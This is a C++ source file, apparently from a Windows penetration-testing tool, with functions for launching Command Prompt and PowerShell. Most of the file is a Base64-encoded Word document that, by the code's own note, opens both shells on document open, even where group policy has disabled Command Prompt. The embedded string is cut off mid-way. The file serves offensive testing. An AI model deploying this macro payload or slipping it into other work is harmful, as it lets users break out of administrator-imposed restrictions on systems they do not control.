#include ".\lib\invoker\invoker.h"
#include ".\lib\base64\base64.h"

// ----------------------------------- SHELL -----------------------------------

void SYSTEM_InvokeShell() {
	Output("################################# EXAMPLES #################################");
	Output("# Command : WHOAMI /PRIV                                                   #");
	Output("################################### NOTE ###################################");
	Output("# If Command Prompt is disabled by a group policy, enter a command.        #");
	Output("############################################################################");
	Output("");
	std::string command = Input("Enter command (optional)");
	Output("");
	ShellExec(command);
}

void SYSTEM_InvokePowerShell() {
	PowerShellExec();
}

void MS_InvokeShells() {
	Output("################################### NOTE ###################################");
	Output("# Command Prompt and PowerShell will run in a new window on document open. #");
	Output("############################################################################");
	Output("");
	// NOTE: Microsoft Word document encoded in Base64.
	std::string encoded = std::string("0M8R4KGxGuEAAAAAAAAAAAAAAAAAAA").append("AAPgADAP7/CQAGAAAAAAAAAAAAAAAB").append("AAAAJwAAAAAAAAAAEAAAKQAAAAIAAA").append("D+////AAAAACYAAAD/////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("//////////////////////////////").append("///////////////////////spcEACQ").append("AJBAAA8BK/AAAAAAAAEAAAAAAACAAA").append("UQgAAA4AYmpiahApECkAAAAAAAAAAA").append("AAAAAAAAAAAAAJBBYANA4AAHJDQWdy").append("Q0FnUQAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAD//w8AAAAAAAAA").append("AAD//w8AAAAAAAAAAAD//w8AAAAAAA").append("AAAAAAAAAAAAAAALcAAAAAAE4HAAAA").append("AAAATgcAAOAUAAAAAAAA4BQAAAAAAA").append("DgFAAAAAAAAOAUAAAAAAAA4BQAABQA").append("AAAAAAAAAAAAAP////8AAAAA9BQAAA").append("AAAAD0FAAAAAAAAPQUAAAAAAAA9BQA").append("AAwAAAAAFQAADAAAAPQUAAAAAAAA+B").append("YAAAwCAAAMFQAAAAAAAAwVAAAAAAAA").append("DBUAAAAAAAAMFQAAAAAAAAwVAAAAAA").append("AA5xUAAAAAAADnFQAAAAAAAOcVAAAA").append("AAAAdxYAAAIAAAB5FgAAAAAAAHkWAA").append("AAAAAAeRYAAAAAAAB5FgAAAAAAAHkW").append("AAAAAAAAeRYAACQAAAAEGQAAtgIAAL").append("obAAA+AAAAnRYAABUAAAAAAAAAAAAA").append("AAAAAAAAAAAA4BQAAAAAAADnFQAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAADnFQAA").append("AAAAAOcVAAAAAAAA5xUAAAAAAADnFQ").append("AAAAAAAJ0WAAAAAAAAAAAAAAAAAADg").append("FAAAAAAAAOAUAAAAAAAADBUAAAAAAA").append("AAAAAAAAAAAAwVAADbAAAAshYAABYA").append("AAAzFgAAAAAAADMWAAAAAAAAMxYAAA").append("AAAADnFQAACgAAAOAUAAAAAAAADBUA").append("AAAAAADgFAAAAAAAAAwVAAAAAAAAdx").append("YAAAAAAAAAAAAAAAAAADMWAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAA5xUAAAAAAAB3FgAAAAAAAAAAAA").append("AAAAAAMxYAAAAAAAAAAAAAAAAAADMW").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAMxYAAAAAAAAMFQAA").append("AAAAAP////8AAAAAMCAxKQet1gEAAA").append("AAAAAAAP////8AAAAA8RUAAAoAAAAz").append("FgAAAAAAAAAAAAAAAAAAYxYAABQAAA").append("DIFgAAMAAAAPgWAAAAAAAAMxYAAAAA").append("AAD4GwAAAAAAAPsVAAAKAAAA+BsAAA").append("AAAAAzFgAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAPgbAAAAAA").append("AAAAAAAAAAAADgFAAAAAAAADMWAAAw").append("AAAA5xUAAAAAAADnFQAAAAAAADMWAA").append("AAAAAA5xUAAAAAAADnFQAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAA5xUAAAAAAADnFQAAAAAA").append("AOcVAAAAAAAAnRYAAAAAAACdFgAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAABRYAAC4AAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAOcVAAAAAAAA5xUAAAAAAA").append("DnFQAAAAAAAPgWAAAAAAAA5xUAAAAA").append("AADnFQAAAAAAAOcVAAAAAAAA5xUAAA").append("AAAAAAAAAAAAAAAP////8AAAAA////").append("/wAAAAD/////AAAAAAAAAAAAAAAA//").append("///wAAAAD/////AAAAAP////8AAAAA").append("/////wAAAAD/////AAAAAP////8AAA").append("AA/////wAAAAD/////AAAAAP////8A").append("AAAA/////wAAAAD/////AAAAAP////").append("8AAAAA/////wAAAAD/////AAAAAPgb").append("AAAAAAAA5xUAAAAAAADnFQAAAAAAAO").append("cVAAAAAAAA5xUAAAAAAADnFQAAAAAA").append("AOcVAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAADnFQ").append("AAAAAAAOcVAAAAAAAA5xUAAAAAAABO").append("BwAAWAwAAKYTAAA6AQAABQASAQAACQ").append("QECAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAEludm9r").append("ZSBDb21tYW5kIFByb21wdCBhbmQgUG").append("93ZXJTaGVsbC4NUHJlc3MgQWx0ICsg").append("RjExIHRvIG9wZW4gdGhlIG1hY3JvIG").append("VkaXRvci4NDQAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAgAACUIAAAmCA").append("AAOQgAAD0IAABPCAAAUAgAAFEIAAD1").append("9fXt9eL1AAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAUFWgAHHkAFm").append("gLDjMAQ0ocAGFKHAAADhZoABx5AENK").append("HABhShwAABQVaAAceQAWaAAceQBDSh").append("wAYUocAAcACAAAJggAAFAIAABRCAAA").append("+gAAAAAAAAAAAAAAAPoAAAAAAAAAAA").append("AAAAD6AAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAEAABnZAAceQAA").append("AzIAMZBoATpwxBtxAB+wgi4gsMZBIb").append("CgBSKwoAUjkKAFJJCgBSWwAAAXsMQC").append("GLDEAgyQxAIAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AAAAAAAAAAAAAAAAAAAAAAAAIgYPAB").append("IAAQB4AQ8ABwADAAQAAwACAAQACAAA").append("AJgAAACeAAAAngAAAJ4AAACeAAAAng").append("AAAJ4AAACeAAAAngAAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAAA2Bg").append("AANgYAAHYCAAB2AgAAdgIAAHYCAAB2").append("AgAAdgIAAHYCAAB2AgAAdgIAADYGAA").append("A2BgAANgYAADYGAAA2BgAANgYAAD4C").append("AAA2BgAANgYAADYGAAA2BgAANgYAAD").append("YGAAA2BgAANgYAADYGAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANg").append("YAADYGAAA2BgAANgYAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAACoAA").append("AANgYAADYGAAAWAAAANgYAADYGAAA2").append("BgAANgYAADYGAAA2BgAANgYAADYGAA").append("C4AAAANgYAADYGAAA2BgAANgYAADYG").append("AAA2BgAANgYAADYGAAA2BgAANgYAAD").append("YGAAA2BgAAaAEAAEgBAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANg").append("YAADYGAAA2BgAANgYAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAAA2Bg").append("AANgYAADYGAAA2BgAANgYAADYGAAA2").append("BgAANgYAADYGAAA2BgAANgYAADYGAA").append("A2BgAANgYAADYGAAA2BgAANgYAADYG").append("AAA2BgAANgYAADYGAAA2BgAANgYAAD").append("YGAAA2BgAANgYAADYGAAA2BgAANgYA").append("ADYGAAA2BgAANgYAADYGAAA2BgAANg").append("YAADYGAAA2BgAANgYAADYGAAA2BgAA").append("NgYAADYGAAA2BgAANgYAADYGAAA2Bg").append("AANgYAAHACAAA2BgAAMgYAABgAAADG").append("AwAA1gMAAOYDAAD2AwAABgQAABYEAA").append("AmBAAANgQAAEYEAABWBAAAZgQAAHYE").append("AACGBAAAlgQAAMYDAADWAwAA5gMAAP").append("YDAAAGBAAAFgQAADIGAAAoAgAA2AEA").append("AOgBAAAmBAAANgQAAEYEAABWBAAAZg").append("QAAHYEAACGBAAAlgQAAMYDAADWAwAA").append("5gMAAPYDAAAGBAAAFgQAACYEAAA2BA").append("AARgQAAFYEAABmBAAAdgQAAIYEAACW").append("BAAAxgMAANYDAADmAwAA9gMAAAYEAA").append("AWBAAAJgQAADYEAABGBAAAVgQAAGYE").append("AAB2BAAAhgQAAJYEAADGAwAA1gMAAO").append("YDAAD2AwAABgQAABYEAAAmBAAANgQA").append("AEYEAABWBAAAZgQAAHYEAACGBAAAlg").append("QAAMYDAADWAwAA5gMAAPYDAAAGBAAA").append("FgQAACYEAAA2BAAARgQAAFYEAABmBA").append("AAdgQAAIYEAACWBAAAxgMAANYDAADm").append("AwAA9gMAAAYEAAAWBAAAJgQAADYEAA").append("BGBAAAVgQAAGYEAAB2BAAAhgQAAJYE").append("AAA4AQAAWAEAAPgBAAAIAgAAGAIAAF").append("YCAAB+AgAAkAIAAKACAACwAgAAwAIA").append("ANACAACAAgAA4AIAAPACAAAAAwAAEA").append("MAACADAAAwAwAAQAMAAOACAADwAgAA").append("AAMAABADAAAgAwAAMAMAAEADAADgAg").append("AA8AIAAAADAAAQAwAAIAMAADADAABA").append("AwAA4AIAAPACAAAAAwAAEAMAACADAA").append("AwAwAAQAMAAOACAADwAgAAAAMAABAD").append("AAAgAwAAMAMAAEADAADgAgAA8AIAAA").append("ADAAAQAwAAIAMAADADAABAAwAA4AIA").append("APACAAAAAwAAEAMAACADAAAwAwAAQA").append("MAAOACAADwAgAAAAMAABADAAAgAwAA").append("MAMAAEADAADgAgAA8AIAAAADAAAQAw").append("AAIAMAADADAABAAwAA4AIAAPACAAAA").append("AwAAEAMAACADAAAwAwAAQAMAAOACAA").append("DwAgAAAAMAABADAAAgAwAAMAMAAEAD").append("AADgAgAA8AIAAAADAAAQAwAAIAMAAD").append("ADAABAAwAA4AIAAPACAAAAAwAAEAMA").append("ACADAAAwAwAAQAMAAOACAADwAgAAAA").append("MAABADAAAgAwAAMAMAAEADAAA2BgAA").append("NgYAADYGAAA2BgAANgYAACQAAABPSg").append("MAUEoEAFFKAwBeSgIAX0gBBG1ICQRu").append("SAQIc0gJBHRIBAgAAAAATgAAYPH/Ag").append("BOAAwQAAAAAAAAAAAGAE4AbwByAG0A").append("YQBsAAAADAAAABJkAwEBABSkoAAcAE").append("NKFgBfSAEEYUoWAG1ICQRuSAQIc0gJ").append("BHRIBAgAAAAAAAAAAAAAAAAAAAAAAA").append("BEAEEg8v+hAEQADA0AAAAAAAAQABYA").append("RABlAGYAYQB1AGwAdAAgAFAAYQByAG").append("EAZwByAGEAcABoACAARgBvAG4AdAAA").append("AAAAUgBpAPP/swBSAAwNAAAAAAAAMA").append("YMAFQAYQBiAGwAZQAgAE4AbwByAG0A").append("YQBsAAAAHAAX9gMAADTWBgABCgNsAD").append("TWBgABBQMAAGH2AwAAAgALAAAAKABr").append("IPT/wQAoAAANAAAAAAAAMAYHAE4Abw").append("AgAEwAaQBzAHQAAAACAAwAAAAAAFBL").append("AwQUAAYACAAAACEA6d4Pv/8AAAAcAg").append("AAEwAAAFtDb250ZW50X1R5cGVzXS54").append("bWyskctOwzAQRfdI/IPlLUqcskAIJe").append("mCx47HonzAyJkkFsnYsqdV+/dM0lRC").append("qCAWbCzZM/eeO+NyvR8HtcOYnKdKr/").append("JCKyTrG0ddpd83T9mtVomBGhg8YaUP").append("mPS6vrwoN4eASYmaUqV75nBnTLI9jp").append("ByH5Ck0vo4Ass1diaA/YAOzXVR3Bjr").append("iZE448lD1+UDtrAdWD3u5fmYJOKQtL").append("o/Nk6sSkMIg7PAktTsqPlGyRZCLsq5").append("J/UupCuJoc1ZwlT5GbDoXmU10TWo3i").append("DyC4wSw7AMiV/PZyAZLea/O56J7NvW").append("WWy83Y6yjnw2XsxOwf8UYPU/6BPTzH").append("9bfwIAAP//AwBQSwMEFAAGAAgAAAAh").append("AKXWp+fAAAAANgEAAAsAAABfcmVscy").append("8ucmVsc4SPz2rDMAyH74W9g9F9UdLD").append("GCV2L6WQQy+jfQDhKH9oIhvbG+vbT8").append("cGCrsIhKTv96k9/q6L+eGU5yAWmqoG").append("w+JDP8to4XY9v3+CyYWkpyUIW3hwhq").append("N727VfvFDRozzNMRulSLYwlRIPiNlP").append("vFKuQmTRyRDSSkXbNGIkf6eRcV/XH5").append("ieGeA2TNP1FlLXN2Cuj6jJ/7PDMMye").append("T8F/ryzlRQRuN5RMaeRioagv41O9kK").append("hlqtQe0LW4+db9AQAA//8DAFBLAwQU").append("AAYACAAAACEAa3mWFoMAAACKAAAAHA").append("AAAHRoZW1lL3RoZW1lL3RoZW1lTWFu").append("YWdlci54bWwMzE0KwyAQQOF9oXeQ2T").append("djuyhFYrLLrrv2AEOcGkHHoNKf29fl").append("44M3zt8U1ZtLDVksnAcNimXNLoi38H").append("wspxuo2kgcxSxs4ccV5ul4GMm0jRPf").append("SchzUX0j1ZCFrbXdINa1K9Uh7yzdXr").append("kkaj2LR1fo0/cp4kXrKyYKAjj9AQAA").append("//8DAFBLAwQUAAYACAAAACEAwjqO9e").append("AGAACzHwAAFgAAAHRoZW1lL3RoZW1l").append("L3RoZW1lMS54bWzsWUtvGzcQvhfof1").append("jsvbFk6xEbkQPrFTfxC5GSIkdKS+3S").append("4i4XJGVHtyI59VKgQFr00AC99VAUDd").append("AADXrpjzHgoE1/RIdcaZeUqPiBFAgK").append("W4Chpb4ZfpyZnZmdvXP3aUy9E8wFYU").append("nDL98q+R5OhiwgSdjwH/W7n932PSFR").append("EiDKEtzwp1j4d7c//eQO2pIRjrEH8o").append("nYQg0/kjLdWlsTQ1hG4hZLcQK/jRiP").append("kYRLHq4FHJ2C3piurZdKtbUYkcT3Eh").append("SD2sPRiAyx11cq/e258g6Fy0QKtTCk").append("vKdUY0tCY4NxWSHEVLQo904QbfiwT8").append("BO+/ip9D2KhIQfGn5J//lr23fW0NZM").append("iMoVsoZcV//N5GYCwXhd78nDQb5ppV").append("Kt1HZy/RpA5TKuU+/UOrVcnwag4RBO").append("mnGxddbXW5UZ1gBlXx262/X2RtnCG/").append("o3ljjvVNXHwmtQpr+yhO92W2BFC69B").append("Gb66hK82N5ttW78GZfjaEr5e2mlX6p").append("Z+DYooScZL6FK1ttGanzaHjBjddcI3").append("q5VufX2mvEBBNOTRpbYYsUSuirUYHT").append("PeBYACUiRJ4slpikdoCFHcQpQMOPH2").append("SBhB4KUoYQKWS+ulbmkD/qtPRX/THk").append("VbGBnSihcwEUtLio8nhpyksuHfB62+").append("ATl/8+bs2euzZ7+fPX9+9uzX2d5alS").append("W3i5LQlHv30zf/vPzS+/u3H9+9+Dbb").append("ehEvTPzbX756+8ef71MPJy5Mcf7dq7").append("evX51///VfP79waN/haGDC+yTGwjvA").append("p95DFsMBHfzxgF9Noh8hYkrsJKFACV").append("K7OPR3ZGShD6aIIgeuiW07PuaQalzA").append("e5Nji3Av4hNJHBofRLEF3GeMNhl3Wu").append("GB2sswc3+ShO7N+cTEPUToxLV3CyWW").append("lzuTFHIscalsRdiieURRIlGIEyw99R").append("sbY+w43RNCLLvukyFngo2k94R4TUSc").append("JumTgRVNhdAuicEvUxdB8Ldlm/3HXp").append("NR16nb+MRGwr2BqIN8H1PLjPfQRKLY").append("pbKPYmoafA/JyEWyN+VDE9cREjwdYs").append("q8ToCFcMkccjiv4fQHkGbcbt+n09hG").append("cknGLp17iDET2WbjVoTi1IXtkSQysZ").append("+LMYQo8o6YdMH3mX2HqGvwA0pWuvsx").append("wZa7L84GjyDDmpSKAFG/TLjDl/cws+").append("K3N6UjhF2pZofHVord4cQZHc1JaIX2").append("HsYUnaIAY+/R5w4GTZZaNi9I348gq+").append("xiV2DdR3asqusEC+iVVHOznCf3iLBC").append("todDtoLP/nQh8UxREiO+SvMBeN20eQ").append("dKXewKgEM6HJvAAwI9IMSL0yiHAnQY").append("wb1S61GErAKmroU7Xqfc8t9l7jG4L4").append("8tGpe4L0EGX1kGErsp817b9BG1NigC").append("po+gy3ClWxCx3F+IqOKqxSZOuZF90x").append("ZugO7IanpiklzYAS30PtX/rveBDuP8").append("h5eO++DD9DtuxVayumKnsyqZ7C70N6").append("twi11Ni/GAfPxNTRtNkiMMdWQ5Y930").append("NDc9jf+/72lW3c83ncyqfuOmk/Ghw7").append("jpZGbDlQ/TyRTNC/Q1auCRDXr02Cde").append("OfUZEUp7ckrxntCDHwHPM0EXFpWcnn").append("jifAqYRvBVlTnYwMKFHGkZjzP5BZFR").append("L0IpTIfKvlISipnqUHgpEzA00stO3Q").append("pPJ/E+C7JhZ7msBptZZRVIFuular4O").append("gyqZoWv1YoCXq9dsQz1onRNQslchYW").append("xmk9hwkKjPF5WR9FgXjOYgoU/2QVhs").append("OljcVurnrlpiAdRyr8ADtweP6Q2/Wg").append("EREIJ5HDTngfJT5uq5d7UzP6SnVxnT").append("igBosOcRUHh6U3FdeTx1uizULuFpi4").append("QRbjYJbRnd4IkIHoNn0alWL0Pjqr7e").append("LFxq0VOm0PtBaBU06rffx+K6vga5xd").append("xAEzNT0MQ7bfi1jSqEzBClDX8EQ2P4").append("GqcQO0I9cyEawpuXoeTZDX+dzJJyId").append("tIRJnBddLJskFMJOYeJXHDV8fP3UAT").append("nUM0t/I6JISPltwmpJWPjRw43XYyHo").append("3wUJpuN1aUpbNLyPBZrnD+qsWvD1aS").append("bALu7kXBqTegE/4QQYhV62VlwIAIeH").append("dQzqwZEHgZlieyIv4WCtMs7Zpvo3QM").append("ZeuIphGaVRQzmWdwncpzOvoqt4FxNT").append("szGNQwyawQDkJVYE2jWtU0rxoZh5VV").append("92IhZTkjaRY108oqqmq6s5i1w7wMLN").append("jyekXeYDU3MeQ0s8JnqXsx5W7Oc91C").append("n5BXCTB4bj9H1b1EQTCoFZtZ1BTj5T").append("SscvZs1a4d8wNeQO0yRcLI+rW52gW7").append("5TXCuR0sXqvyg9xi1MLSaN5Xakvrt+").append("bmi202OIbk0YYud0Kl0K6EyS5H0BD1").append("dE+Spw0tuv0vAAAA//8DAFBLAwQUAA").append("YACAAAACEADdGQn7YAAAAbAQAAJwAA").append("AHRoZW1lL3RoZW1lL19yZWxzL3RoZW").append("1lTWFuYWdlci54bWwucmVsc4SPTQrC").append("MBSE94J3CG9v07oQkSbdiNCt1AOE5D").append("UNNj8kUeztDa4sCC6HYb6ZabuXnckT").append("YzLeMWiqGgg66ZVxmsFtuOyOQFIWTo").append("nZO2SwYIKObzftFWeRSyhNJiRSKC4x").append("mHIOJ0qTnNCKVPmArjijj1bkIqOmQc").append("i70Ej3dX2g8ZsBfMUkvWIQe9UAGZZQ").append("mv+z/TgaiWcvHxZd/lFBc9mFBSiixs").append("zgI5uqTATKW7q6xN8AAAD//wMAUEsB").append("Ai0AFAAGAAgAAAAhAOneD7//AAAAHA").append("IAABMAAAAAAAAAAAAAAAAAAAAAAFtD").append("b250ZW50X1R5cGVzXS54bWxQSwECLQ").append("AUAAYACAAAACEApdan58AAAAA2AQAA").append("CwAAAAAAAAAAAAAAAAAwAQAAX3JlbH").append("MvLnJlbHNQSwECLQAUAAYACAAAACEA").append("a3mWFoMAAACKAAAAHAAAAAAAAAAAAA").append("AAAAAZAgAAdGhlbWUvdGhlbWUvdGhl").append("bWVNYW5hZ2VyLnhtbFBLAQItABQABg").append("AIAAAAIQDCOo714AYAALMfAAAWAAAA").append("AAAAAAAAAAAAANYCAAB0aGVtZS90aG").append("VtZS90aGVtZTEueG1sUEsBAi0AFAAG").append("AAgAAAAhAA3RkJ+2AAAAGwEAACcAAA").append("AAAAAAAAAAAAAA6gkAAHRoZW1lL3Ro").append("ZW1lL19yZWxzL3RoZW1lTWFuYWdlci").append("54bWwucmVsc1BLBQYAAAAABQAFAF0B").append("AADlCgAAAAA8P3htbCB2ZXJzaW9uPS").append("IxLjAiIGVuY29kaW5nPSJVVEYtOCIg").append("c3RhbmRhbG9uZT0ieWVzIj8+DQo8YT").append("pjbHJNYXAgeG1sbnM6YT0iaHR0cDov").append("L3NjaGVtYXMub3BlbnhtbGZvcm1hdH").append("Mub3JnL2RyYXdpbmdtbC8yMDA2L21h").append("aW4iIGJnMT0ibHQxIiB0eDE9ImRrMS").append("IgYmcyPSJsdDIiIHR4Mj0iZGsyIiBh").append("Y2NlbnQxPSJhY2NlbnQxIiBhY2Nlbn").append("QyPSJhY2NlbnQyIiBhY2NlbnQzPSJh").append("Y2NlbnQzIiBhY2NlbnQ0PSJhY2Nlbn").append("Q0IiBhY2NlbnQ1PSJhY2NlbnQ1IiBh").append("Y2NlbnQ2PSJhY2NlbnQ2IiBobGluaz").append("0iaGxpbmsiIGZvbEhsaW5rPSJmb2xI").append("bGluayIvPgAAAABRAAAAHgAADgAAAA").append("D/////AAgAAFEIAAAFAAAAAAgAAFEI").append("AAAGAAAADwAA8DgAAAAAAAbwGAAAAA").append("IEAAACAAAAAQAAAAEAAAABAAAAAgAA").append("AEAAHvEQAAAA//8AAAAA/wCAgIAA9w").append("AAEAAPAALwkgAAABAACPAIAAAAAQAA").append("AAEEAAAPAAPwMAAAAA8ABPAoAAAAAQ").append("AJ8BAAAAAAAAAAAAAAAAAAAAAAAAAA").append("AgAK8AgAAAAABAAABQAAAA8ABPBCAA").append("AAEgAK8AgAAAABBAAAAA4AAFMAC/Ae").append("AAAAvwEAABAAywEAAAAA/wEAAAgABA").append("MJAAAAPwMBAAEAAAAR8AQAAAABAAAA").append("AAAAAFMAAAAHAAAAAABTAAAABwAAAA").append("AAUwAAAAcAAAAAACUAAAAlAAAAOQAA").append("AD0AAABPAAAAUAAAAFMAAAADAAQAAw").append("AEAAMABAAHAAYAAAAEAAAACAAAAOUA").append("AAAAAAAABAAAACdCBQBPMQkA6wwWAA").append("sOMwDEG3EAABx5AAAAAABRAAAAUwAA").append("AAAAAAABAAAA/0ADgAEATwAAAE8AAA").append("AAAAAAAQABAE8AAAAAAAAATwAAAAAA").append("AAACEAAAAAAAAABRAAAA4AEAEABAAA").append("D//wEAAAAHAFUAbgBrAG4AbwB3AG4A").append("//8BAAgAAAAAAAAAAAAAAP//AQAAAA").append("AA//8AAAIA//8AAAAA//8AAAIA//8A").append("AAAACAAAAEcekAEAAAICBgMFBAUCAw").append("T/LgDgW3gAwAkAAAAAAAAA/wEAAAAA").append("AABUAGkAbQBlAHMAIABOAGUAdwAgAF").append("IAbwBtAGEAbgAAADUekAECAAUFAQIB").append("BwYCBQcAAAAAAAAAEAAAAAAAAAAAAA").append("AAgAAAAABTAHkAbQBiAG8AbAAAADMu").append("kAEAAAILBgQCAgICAgT/LgDgW3gAwA").append("kAAAAAAAAA/wEAAAAAAABBAHIAaQBh").append("AGwAAAA3LpABAAACDwUCAgIEA